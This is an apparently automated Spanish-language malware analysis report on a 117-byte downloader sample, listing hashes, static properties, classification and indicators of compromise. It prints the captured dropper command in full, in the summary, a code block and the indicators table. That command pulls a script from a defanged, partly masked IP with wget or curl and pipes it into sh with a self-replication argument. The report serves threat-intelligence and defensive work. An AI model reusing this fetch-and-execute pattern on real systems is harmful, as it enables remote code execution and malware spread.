# 🧬 Payload Analysis

`eef62361c0827512a3f4151c1b985ffe1c94967d3105bc82abbcf110f9050be2`

## 📌 Resumen

Texto ASCII de 117 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://14.46.136.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh`
2. `curl -sk hxxps://14.46.136.XXX/sh)`
3. `sh -s apache.selfrep` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/eef62361c0827512a3f4151c1b985ffe1c94967d3105bc82abbcf110f9050be2.md](../../../../../malware-like/oraculo/downloader/eef62361c0827512a3f4151c1b985ffe1c94967d3105bc82abbcf110f9050be2.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `eef62361c0827512a3f4151c1b985ffe1c94967d3105bc82abbcf110f9050be2`
- **SHA1:** `53cc84d8596973eb4ea5a89683c4cd13d7853f39`
- **MD5:** `9ecc2b14cdcac2f4ce0257fff73717e0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 117 B |
| Entropía | 4.63 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
| hash | eef62361c0827512a3f4151c1b985ffe1c94967d3105bc82abbcf110f9050be2 | static_analysis |
| ip | 211.62.61.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
